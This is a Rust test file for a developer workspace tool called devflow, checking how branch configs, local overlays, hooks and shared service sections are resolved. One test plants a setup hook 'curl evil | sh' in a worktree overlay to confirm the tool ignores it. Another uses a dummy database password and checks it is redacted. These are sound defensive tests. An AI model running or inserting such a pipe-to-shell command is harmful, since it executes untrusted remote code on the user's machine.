            "[hooks]\nsetup = ['echo changed >> .devflow/runs']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\n",
        ),
    );
    assert_eq!(status_of(&t.project, &ws), Some(Status::NeedsAttention));
}

// --- a start point that cannot have the file ----------------------------------

#[test]
fn a_worktree_made_while_the_main_checkouts_file_is_not_committed_says_exactly_that() {
    init();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap().join("shop");
    std::fs::create_dir_all(&root).unwrap();
    let mut options = git2::RepositoryInitOptions::new();
    options.initial_head("main");
    git2::Repository::init_opts(&root, &options).unwrap();
    std::fs::write(root.join("README.md"), "shop\n").unwrap();
    commit_all(&root, "first");
    // `devflow init` wrote the file; nobody committed it yet.
    let id = uuid::Uuid::new_v4();
    std::fs::write(root.join("devflow.toml"), config(id, HOOKS_MAIN)).unwrap();
    let project = Project::open(&root).unwrap();

    let out = create(&project, "early", None, SetupOptions::default());
    let ws = out.workspace.clone();
    assert_eq!(out.status, Status::NeedsAttention);
    let because = match &out.recipes.source {
        RecipesSource::Unavailable { because } => because.clone(),
        other => panic!("{other:?}"),
    };
    assert_eq!(because.kind, ProblemKind::NotCommitted);
    assert_eq!(because.kind.as_str(), "not_committed");
    assert_eq!(because.file, root.join("devflow.toml"));
    // The start point (its commit) has no file, and the main checkout's is not committed.
    let head = git2::Repository::open(&ws.path)
        .unwrap()
        .head()
        .unwrap()
        .peel_to_commit()
        .unwrap()
        .id()
        .to_string();
    assert!(
        because.message.contains(&head[..8])
            && because.message.contains("has no devflow.toml")
            && because.message.contains("not committed")
            && because
                .message
                .contains(&root.join("devflow.toml").display().to_string()),
        "{}",
        because.message
    );
    assert!(!because.message.contains("`devflow"));
    // Remedies, in this order: the choice, then the file to commit.
    assert_eq!(
        out.remedies,
        [
            Remedy::UseDefaultRecipes {
                workspace: ws.path.clone()
            },
            Remedy::OpenFile {
                path: root.join("devflow.toml")
            }
        ]
    );
    // `doctor` and the editing commands point the same way.
    let checks = doctor::run_in(Some(&project), &ws.path);
    let check = checks.iter().find(|c| c.name == "recipes").unwrap();
    assert!(check.detail.contains("not committed"), "{}", check.detail);
    assert_eq!(check.remedies, out.remedies);
    let error = devflow_core::config_edit::ConfigFiles::read_for(&project, &ws.path).unwrap_err();
    assert_eq!(devflow_core::remedy::remedies_of(&error), out.remedies);

    // Committed since, the file is no longer the reason: the ordinary problem.
    commit_all(&root, "devflow.toml");
    match project.at(&ws.path).recipes() {
        RecipesSource::Unavailable { because } => assert_eq!(because.kind, ProblemKind::Missing),
        other => panic!("{other:?}"),
    }
}

#[cfg(unix)]
#[test]
fn a_fifo_named_devflow_toml_in_a_worktree_is_a_problem_not_a_hang() {
    let t = repo(HOOKS_MAIN);
    let ws = create(&t.project, "fifo", None, SetupOptions::default()).workspace;
    std::fs::remove_file(ws.path.join("devflow.toml")).unwrap();
    let status = std::process::Command::new("mkfifo")
        .arg(ws.path.join("devflow.toml"))
        .status()
        .unwrap();
    assert!(status.success());
    // Nothing writes to it: an ordinary read would wait for a writer for good.
    let (sender, receiver) = std::sync::mpsc::channel();
    let (project, path) = (t.project.clone(), ws.path.clone());
    std::thread::spawn(move || {
        let _ = sender.send(project.at(&path).recipes());
    });
    let recipes = receiver
        .recv_timeout(std::time::Duration::from_secs(20))
        .expect("reading the worktree's file did not return");
    match recipes {
        RecipesSource::Unavailable { because } => {
            assert_eq!(because.kind, ProblemKind::Invalid);
            assert!(
                because.message.contains("not a regular file"),
                "{}",
                because.message
            );
        }
        other => panic!("{other:?}"),
    }
}

// --- shared sections --------------------------------------------------------

#[test]
fn a_branchs_services_are_ignored_and_reported_by_file_and_section() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "svc", None, SetupOptions::default()).workspace;
    assert!(t.project.config.services.is_empty());

    let text = config(
        t.id,
        "[services.db]\nengine = \"postgres\"\nmode = \"external\"\nadmin_url = \"postgres://u:hunter2@h/d\"\n\n[hooks]\nsetup = ['echo main >> .devflow/runs']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\ndir = \"../elsewhere\"\n",
    ); // kingfisher:ignore
    write_in(&w, "devflow.toml", &text);

    let at = t.project.at(&w.path);
    assert!(
        at.config.services.is_empty(),
        "a branch never reconfigures a shared server or acquires a resource by renaming a service"
    );
    assert_eq!(at.config.worktree.dir, t.project.config.worktree.dir);
    let effective = at.effective();
    let sections: Vec<&str> = effective
        .differing
        .iter()
        .map(|d| d.section.as_str())
        .collect();
    assert!(sections.contains(&"[services.db]"), "{sections:?}");
    assert!(sections.contains(&"[worktree] dir"), "{sections:?}");
    for differing in &effective.differing {
        assert_eq!(differing.file, w.path.join("devflow.toml"));
    }
    // A shared section is not part of the recipes: nothing to approve again,
    // nothing reopened.
    assert_eq!(status_of(&t.project, &w), Some(Status::Ready));

    // Setup and switch say so, naming the file and section and never a value.
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    let warning = out
        .warnings
        .iter()
        .find(|w| w.contains("[services.db]"))
        .unwrap_or_else(|| panic!("{:?}", out.warnings));
    assert!(warning.contains(&w.path.join("devflow.toml").display().to_string()));
    assert!(!out.warnings.iter().any(|w| w.contains("hunter2")));
    assert_eq!(out.recipes.differing.len(), 2);
    assert!(
        out.receipt.services.is_empty(),
        "no service was provisioned"
    );

    // `doctor` warns the same way.
    let checks = doctor::run_in(Some(&t.project), &w.path);
    let found: Vec<_> = checks
        .iter()
        .filter(|c| c.name == "shared-sections")
        .collect();
    assert_eq!(found.len(), 2, "{found:?}");
    assert!(found.iter().all(|c| !c.detail.contains("hunter2")));
}

#[test]
fn a_local_overlay_inside_a_worktree_is_ignored_and_the_main_checkouts_applies_to_all() {
    let t = repo(HOOKS_MAIN);
    let w = create(&t.project, "local", None, SetupOptions::default()).workspace;
    std::fs::write(
        w.path.join("devflow.local.toml"),
        "[hooks]\nsetup = ['curl evil | sh']\n",
    )
    .unwrap();
    std::fs::write(
        t.root.join("devflow.local.toml"),
        "[env]\nFROM_LOCAL = \"1\"\n",
    )
    .unwrap();
    let project = Project::open(&t.root).unwrap();
    let at = project.at(&w.path);
    assert_eq!(
        at.config.hooks.setup.len(),
        1,
        "{:?}",
        at.config.hooks.setup
    );
    assert_ne!(at.config.hooks.setup[0].run, "curl evil | sh");
    assert!(
        at.config.env.vars.contains_key("FROM_LOCAL"),
        "the main checkout's overlay applies to the workspace"
    );
    let effective = at.effective();
    assert_eq!(
        effective.ignored_local,
        Some(w.path.join("devflow.local.toml"))
    );
    assert!(
        effective
            .ignored_local_warning()
            .unwrap()
            .contains("ignored"),
        "{:?}",
        effective.ignored_local_warning()
    );
    let checks = doctor::run_in(Some(&project), &w.path);
    assert!(
        checks
            .iter()
            .any(|c| c.name == "local-config" && c.detail.contains("ignored")),
        "{checks:?}"
    );
}

// --- one configuration for a whole run ----------------------------------------

#[test]
fn a_hook_that_rewrites_devflow_toml_changes_nothing_for_that_run() {
    let t = repo("");
    let w = create(&t.project, "rewrite", None, SetupOptions::default()).workspace;
    // The branch's recipes: the first setup hook rewrites the file (it removes
    // the other hooks and adds a recipe), the second must still run, and so
    // must the switch hook of the entry.
    let rewritten = config(
        t.id,
        "[hooks]\nsetup = []\nswitch = []\n\n[env]\nSNEAKY = \"1\"\n",
    )
    .replace('\n', "\\n")
    .replace('"', "\\\"");
    let text = config(
        t.id,
        &format!(
            "[hooks]\nsetup = ['printf \"{rewritten}\" > devflow.toml', 'touch .devflow/second']\nswitch = ['touch .devflow/switched']\n"
        ),
    );
    write_in(&w, "devflow.toml", &text);
    // A new instance of the same workspace: setup runs the whole pipeline.
    let mut receipt = receipt_of(&w);
    receipt.set_phase(Phase::Hooks, PhaseState::Pending, None);
    receipt.save(&w.git_dir).unwrap();
    approve(&t.project, &w);

    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert!(
        std::fs::read_to_string(w.path.join("devflow.toml"))
            .unwrap()
            .contains("SNEAKY"),
        "the hook did rewrite the file"
    );
    assert!(
        w.path.join(".devflow/second").is_file(),
        "the run kept the hooks it started with"
    );
    assert!(
        w.path.join(".devflow/switched").is_file(),
        "and the switch hooks of that same configuration"
    );
    assert_eq!(out.hooks.as_ref().unwrap().runs.len(), 2);
    assert!(
        !env_map(&w).contains_key("SNEAKY"),
        "the recipes were not re-read"
    );
    assert!(matches!(
        out.recipes.source,
        RecipesSource::Workspace { .. }
    ));
}

// --- review round 1 ---------------------------------------------------------

const CACHE: &str = "[services.cache]\nengine = \"valkey\"\nenv = \"CACHE_URL\"\n\n";

/// A repository whose main checkout has a cache service and whose branch
/// `old` predates it: its own file has none.
fn project_with_an_older_branch() -> (Repo, Workspace) {
    let t = repo(&format!("{CACHE}{HOOKS_MAIN}"));
    // (No service is provisioned: the test is about configuration.)
    let old = create(
        &t.project,
        "old",
        None,
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .workspace;
    write_in(
        &old,
        "devflow.toml",
        &config(t.id, "[hooks]\nsetup = ['echo old >> .devflow/runs']\n"),
    );
    (t, old)
}

#[test]
fn a_local_env_edit_made_in_an_older_branch_cannot_invalidate_the_project() {
    use devflow_core::config_edit::{self, ConfigFiles, Edit, Target};
    let (t, old) = project_with_an_older_branch();
    let files = ConfigFiles::read_for(&t.project, &old.path).unwrap();
    assert!(matches!(files.source, RecipesSource::Workspace { .. }));
    let set = |key: &str| Edit::SetEnv {
        key: key.into(),
        value: "x".into(),
    };

    // The branch has no cache service, but the main checkout does: a recipe for
    // the variable it exports would make the main checkout's configuration
    // invalid. It is refused before anything is written, in the local file and
    // in the branch's own file alike.
    for target in [Target::Local, Target::Project] {
        let error = config_edit::apply_to(
            &files,
            target,
            files.file(target).hash.as_deref(),
            &set("CACHE_URL"),
        )
        .unwrap_err();
        let text = format!("{error:#}");
        assert!(
            text.contains("CACHE_URL") && text.contains("nothing was written"),
            "{target:?}: {text}"
        );
    }
    assert!(
        !t.root.join("devflow.local.toml").exists(),
        "no overlay was written"
    );
    assert!(
        !std::fs::read_to_string(old.path.join("devflow.toml"))
            .unwrap()
            .contains("CACHE_URL")
    );
    assert!(
        Project::open(&t.root).is_ok(),
        "the main checkout still opens"
    );

    // An edit that is fine next to the main checkout's services goes through,
    // from the same workspace.
    let applied = config_edit::apply_to(
        &files,
        Target::Local,
        files.local.hash.as_deref(),
        &set("FINE"),
    )
    .unwrap();
    assert_eq!(applied.path, t.root.join("devflow.local.toml"));
    assert!(Project::open(&t.root).is_ok());
    let at = Project::open(&t.root).unwrap();
    assert!(at.at(&old.path).config.env.vars.contains_key("FINE"));
}

#[test]
fn a_shared_local_override_does_not_disable_a_branchs_valid_recipes() {
    let t = repo(&format!(
        "[services.db]\nengine = \"postgres\"\nmode = \"external\"\nadmin_url = \"postgres://u@h/main\"\n\n{HOOKS_MAIN}"
    ));
    let old = create(
        &t.project,
        "old",
        None,
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .workspace;
    // An older branch: no database service of its own, hooks and `[env]` that
    // are valid.
    write_in(
        &old,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['echo old >> .devflow/runs']\n\n[env]\nFROM_OLD = \"1\"\n",
        ),
    );
    // The machine's overlay refines the database service and sets a recipe.
    std::fs::write(
        t.root.join("devflow.local.toml"),
        "[services.db]\nadmin_url = \"postgres://u@h/overlay\"\n\n[env]\nFROM_LOCAL = \"1\"\n",
    )
    .unwrap();
    let project = Project::open(&t.root).unwrap();
    let at = project.at(&old.path);
    match at.recipes() {
        RecipesSource::Workspace { .. } => {}
        other => panic!("the overlay's shared field disabled the branch's recipes: {other:?}"),
    }
    // The overlay's shared fields went to the main checkout's configuration
    // (which the branch shares), its recipe fields to the branch's recipes.
    assert_eq!(at.config.services, project.main_config().services);
    assert!(
        format!("{:?}", at.config.services["db"]).contains("overlay"),
        "the main checkout's database is the overlay's"
    );
    assert_eq!(at.config.hooks.setup.len(), 1);
    assert!(at.config.env.vars.contains_key("FROM_OLD"));
    assert!(at.config.env.vars.contains_key("FROM_LOCAL"));
    assert!(!at.config.env.vars.contains_key("FROM_MAIN"));
    // That the branch has no such service is a difference to report, not a reason
    // to refuse it.
    let sections: Vec<String> = at
        .effective()
        .differing
        .iter()
        .map(|d| d.section.clone())
        .collect();
    assert_eq!(sections, ["[services.db]"]);
    assert_eq!(status_of(&project, &old), Some(Status::NeedsAttention));
    assert!(matches!(
        project.at(&old.path).recipes(),
        RecipesSource::Workspace { .. }
    ));
    // The editing commands read the same: the branch's recipes with the overlay's.
    let files = devflow_core::config_edit::ConfigFiles::read_for(&project, &old.path).unwrap();
    assert!(
        files
            .env()
            .unwrap()
            .recipes
            .iter()
            .any(|r| r.key == "FROM_LOCAL")
    );
}

#[test]
fn if_new_still_does_the_bookkeeping_of_a_ready_workspace() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    let skip = |ws: &Workspace| {
        setup::setup(
            &t.project,
            ws,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress,
        )
        .unwrap()
    };

    // An upgraded workspace that hosts keep entering with `--if-new`: it gains
    // the generation of its hooks, so that a change to them is seen later.
    let upgraded = create(&t.project, "upgraded", None, SetupOptions::default()).workspace;
    as_an_earlier_devflow_wrote_it(&upgraded);
    assert!(skip(&upgraded).is_none(), "nothing to set up");
    let receipt = receipt_of(&upgraded);
    assert!(receipt.hooks_generation.is_some() && receipt.workspace_recipes);
    write_in(
        &upgraded,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['echo again']\n\n[env]\nFROM_MAIN = \"1\"\n\n[worktree]\ncopy = ['.env']\n",
        ),
    );
    assert_eq!(
        status_of(&t.project, &upgraded),
        Some(Status::NeedsAttention),
        "the change to the setup hooks alone is seen"
    );

    // A recorded choice of the default recipes is cleared once the branch has a
    // valid file, though the run leaves the workspace alone.
    let chosen = create(
        &t.project,
        "chosen",
        Some(&t.before_devflow),
        SetupOptions {
            use_default_recipes: true,
            ..Default::default()
        },
    )
    .workspace;
    assert!(receipt_of(&chosen).default_recipes.is_some());
    write_in(
        &chosen,
        "devflow.toml",
        &std::fs::read_to_string(t.root.join("devflow.toml")).unwrap(),
    );
    assert_eq!(status_of(&t.project, &chosen), Some(Status::Ready));
    assert!(skip(&chosen).is_none());
    let receipt = receipt_of(&chosen);
    assert!(receipt.default_recipes.is_none(), "{receipt:?}");

    // A workspace whose branch has none of its own keeps the default's: nothing
    // is recorded by a run that has no outcome to report it in; the next run that
    // has one says so, once.
    let old = create(
        &t.project,
        "old",
        Some(&t.before_devflow),
        SetupOptions {
            use_default_recipes: true,
            ..Default::default()
        },
    )
    .workspace;
    as_an_earlier_devflow_wrote_it(&old);
    assert!(skip(&old).is_none());
    let receipt = receipt_of(&old);
    assert!(!receipt.workspace_recipes && receipt.default_recipes.is_none());
    assert_eq!(status_of(&t.project, &old), Some(Status::Ready));
    let out = setup::activate(&t.project, &old, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.recipes.choice, Some(ChoiceChange::Migrated));
}

#[test]
fn a_reset_does_not_reopen_a_branch_whose_recipes_differ_from_the_main_checkouts() {
    let t = repo("[env]\nMODE = \"main\"\n");
    trust::approve(&t.project).unwrap();
    let ws = create(&t.project, "branch", None, SetupOptions::default()).workspace;
    write_in(
        &ws,
        "devflow.toml",
        &config(
            t.id,
            "[hooks]\nsetup = ['true']\n\n[env]\nMODE = \"branch\"\n",
        ),
    );
    approve(&t.project, &ws);
    let out = setup_again(&t.project, &ws, SetupOptions::default());
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let kept = std::fs::read(Receipt::path(&ws.git_dir)).unwrap();

    // The caller holds the main checkout's project, as the app and the command
    // line do. The reset stops (this workspace has no database) before touching
    // anything, and it must not have recorded a drift of recipes it does not run.
    let error = setup::reset_data(&t.project, &ws, None).unwrap_err();
    assert!(format!("{error:#}").contains("no database"), "{error:#}");
    assert_eq!(
        std::fs::read(Receipt::path(&ws.git_dir)).unwrap(),
        kept,
        "the receipt was not rewritten"
    );
    assert_eq!(status_of(&t.project, &ws), Some(Status::Ready));
}

#[test]
fn recipes_valid_next_to_the_main_checkouts_services_are_not_refused_for_the_branchs_own() {
    use devflow_core::config_edit::{self, ConfigFiles, Edit, Target};
    // Main and the branch both define the cache, which exports OLD_CACHE_URL.
    let cache = "[services.cache]\nengine = \"valkey\"\nenv = \"OLD_CACHE_URL\"\n\n";
    let t = repo(&format!("{cache}{HOOKS_MAIN}"));
    let ws = create(
        &t.project,
        "branch",
        None,
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .workspace;
    write_in(
        &ws,
        "devflow.toml",
        &config(
            t.id,
            &format!("{cache}[hooks]\nsetup = ['echo own >> .devflow/runs']\n"),
        ),
    );
    // The machine's overlay changes the export and writes a recipe that uses the
    // new name. Main loads: the cache exports CACHE_URL there.
    std::fs::write(
        t.root.join("devflow.local.toml"),
        "[services.cache]\nenv = \"CACHE_URL\"\n\n[env]\nAPP_CACHE_URL = \"${CACHE_URL}\"\n",
    )
    .unwrap();
    let project = Project::open(&t.root).expect("the main checkout is valid");
    assert_eq!(project.config.url_variable("cache"), Some("CACHE_URL"));

    // The branch's recipes are checked next to main's services, not next to the
    // export its own file says: the recipe is valid, and the branch runs it.
    let at = project.at(&ws.path);
    match at.recipes() {
        RecipesSource::Workspace { .. } => {}
        other => panic!("a valid recipe was refused for the branch: {other:?}"),
    }
    assert!(at.config.env.vars.contains_key("APP_CACHE_URL"));
    assert_eq!(at.config.url_variable("cache"), Some("CACHE_URL"));
    assert_eq!(at.config.hooks.setup.len(), 1);

    // The views and the edits read it the same way.
    let files = ConfigFiles::read_for(&project, &ws.path).unwrap();
    assert!(
        files
            .env()
            .unwrap()
            .recipes
            .iter()
            .any(|recipe| recipe.key == "APP_CACHE_URL")
    );
    let set = |key: &str, value: &str| Edit::SetEnv {
        key: key.into(),
        value: value.into(),
    };
    config_edit::apply_to(
        &files,
        Target::Project,
        files.project.hash.as_deref(),
        &set("ALSO", "${CACHE_URL}"),
    )
    .expect("a reference to what main's cache exports is valid");
    let again = ConfigFiles::read_for(&project, &ws.path).unwrap();
    let error = config_edit::apply_to(
        &again,
        Target::Project,
        again.project.hash.as_deref(),
        &set("STALE", "${OLD_CACHE_URL}"),
    )
    .unwrap_err();
    let text = format!("{error:#}");
    assert!(
        text.contains("STALE") && text.contains("nothing was written"),
        "{text}"
    );
    // A recipe that sets a name main's cache exports is refused too, though the
    // branch's own file never exported it.
    let error = config_edit::apply_to(
        &again,
        Target::Project,
        again.project.hash.as_deref(),
        &set("CACHE_URL", "x"),
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("CACHE_URL"), "{error:#}");
}

#[test]
fn if_new_judges_the_whole_skip_again_under_the_lock() {
    let t = repo(HOOKS_MAIN);
    trust::approve(&t.project).unwrap();
    let ws = create(&t.project, "ready", None, SetupOptions::default()).workspace;
    let a = receipt_of(&ws).instance_id;
    let interleaved = |instance: Option<uuid::Uuid>, between: &mut dyn FnMut()| {
        setup::setup_interleaved(
            &t.project,
            &ws,
            SetupOptions::default(),
            (true, false),
            instance,
            between,
            &mut NoProgress,
        )
        .unwrap()
    };

    // Nothing changes between the looks: it is skipped.
    assert!(interleaved(Some(a), &mut || {}).is_none());

    // The first look sees instance A, which `DEVFLOW_INSTANCE_ID` names. Another
    // setup then finishes as ready instance B. Under the lock the identity that
    // was asked for is not B's: a real setup replaces it, not a skip.
    let mut other = || {
        let mut receipt = Receipt::load(&ws.git_dir).unwrap().unwrap();
        receipt.instance_id = uuid::Uuid::new_v4();
        receipt.save(&ws.git_dir).unwrap();
    };
    let out = interleaved(Some(a), &mut other).expect("the identity is replaced, not skipped");
    assert_eq!(out.receipt.instance_id, a);
    assert_eq!(receipt_of(&ws).instance_id, a);

    // A derived file is lost between the looks: the repair is not skipped.
    assert!(interleaved(None, &mut || {}).is_none());
    let mut lose = || std::fs::remove_file(env_file::path(&ws.path)).unwrap();
    let out = interleaved(None, &mut lose).expect("the lost file is written again");
    assert!(
        out.repaired.iter().any(|r| r.describe().contains("env")),
        "{:?}",
        out.repaired
    );
    assert!(env_file::path(&ws.path).is_file());

    // The receipt is gone: there is nothing to leave alone.
    let mut vanish = || std::fs::remove_file(Receipt::path(&ws.git_dir)).unwrap();
    let out = interleaved(None, &mut vanish).expect("a workspace without a receipt is set up");
    assert!(Receipt::path(&ws.git_dir).is_file());
    assert_ne!(out.receipt.instance_id, a, "it is a new adoption");
}

// --- editing goes where the section comes from ---------------------------------

#[test]
fn edits_name_the_file_the_workspace_takes_the_section_from() {
    use devflow_core::config_edit::{self, ConfigFiles, Edit, Target};
    let t = repo(HOOKS_MAIN);
    let w = create(&t.project, "edit", None, SetupOptions::default()).workspace;

    // A workspace with a file of its own edits that file.
    let files = ConfigFiles::read_for(&t.project, &w.path).unwrap();
    assert_eq!(files.project.path, w.path.join("devflow.toml"));
    assert!(matches!(files.source, RecipesSource::Workspace { .. }));
    let applied = config_edit::apply_to(
        &files,
        Target::Project,
        files.project.hash.as_deref(),
        &Edit::SetEnv {
            key: "ADDED".into(),
            value: "1".into(),
        },
    )
    .unwrap();
    assert_eq!(applied.path, w.path.join("devflow.toml"));
    assert!(
        std::fs::read_to_string(w.path.join("devflow.toml"))
            .unwrap()
            .contains("ADDED")
    );
    assert!(
        !std::fs::read_to_string(t.root.join("devflow.toml"))
            .unwrap()
            .contains("ADDED"),
        "the main checkout's file is not the workspace's"
    );

    // The main checkout edits its own.
    let main = ConfigFiles::read_for(&t.project, &t.root).unwrap();
    assert_eq!(main.project.path, t.root.join("devflow.toml"));
    assert!(matches!(main.source, RecipesSource::Main { .. }));
    // `--local` is the main checkout's, whichever workspace is targeted.
    assert_eq!(files.local.path, t.root.join("devflow.local.toml"));

    // A workspace that chose the default recipes edits the main checkout's file.
    let old = create(
        &t.project,
        "old",
        Some(&t.before_devflow),
        SetupOptions::default(),
    )
    .workspace;
    let error = ConfigFiles::read_for(&t.project, &old.path).unwrap_err();
    let remedies = devflow_core::remedy::remedies_of(&error);
    assert!(
        remedies
            .iter()
            .any(|r| matches!(r, Remedy::UseDefaultRecipes { .. })),
        "{remedies:?}"
    );
    setup_again(
        &t.project,
        &old,
        SetupOptions {
            use_default_recipes: true,
            ..Default::default()
        },
    );
    let files = ConfigFiles::read_for(&t.project, &old.path).unwrap();
    assert_eq!(files.project.path, t.root.join("devflow.toml"));
    assert!(matches!(files.source, RecipesSource::DefaultChosen { .. }));
}

#[test]
fn list_reports_where_each_workspaces_recipes_come_from() {
    let t = repo(HOOKS_MAIN);
    let _own = create(&t.project, "own", None, SetupOptions::default());
    let _none = create(
        &t.project,
        "none",
        Some(&t.before_devflow),
        SetupOptions::default(),
    );
    let listed = setup::list(&t.project).unwrap();
    let source = |name: &str| {
        listed
            .iter()
            .find(|item| item.workspace.name == name)
            .and_then(|item| item.recipes.as_ref())
            .map(|r| r.source.label())
    };
    assert_eq!(source("main"), Some("main"));
    assert_eq!(source("own"), Some("workspace"));
    assert_eq!(source("none"), Some("unavailable"));
    // The JSON a frontend reads carries the same.
    let json = serde_json::to_value(&listed).unwrap();
    let by_name: std::collections::BTreeMap<String, String> = json
        .as_array()
        .unwrap()
        .iter()
        .map(|item| {
            (
                item["workspace"]["name"].as_str().unwrap().to_string(),
                item["recipes"]["source"].as_str().unwrap().to_string(),
            )
        })
        .collect();
    assert_eq!(by_name["main"], "main");
    assert_eq!(by_name["own"], "workspace");
    assert_eq!(by_name["none"], "unavailable");
}

trait OutcomeExt {
    fn remedies_text(&self) -> Vec<String>;
}

impl OutcomeExt for SetupOutcome {
    /// Messages of the outcome that carry a command line (there must be none).
    fn remedies_text(&self) -> Vec<String> {
        self.warnings
            .iter()
            .chain(
                [Phase::Payload, Phase::Env, Phase::Hooks]
                    .iter()
                    .filter_map(|p| self.receipt.phases.get(p.as_str())?.detail.as_ref()),
            )
            .filter(|text| text.contains("`devflow"))
            .cloned()
            .collect()
    }
}
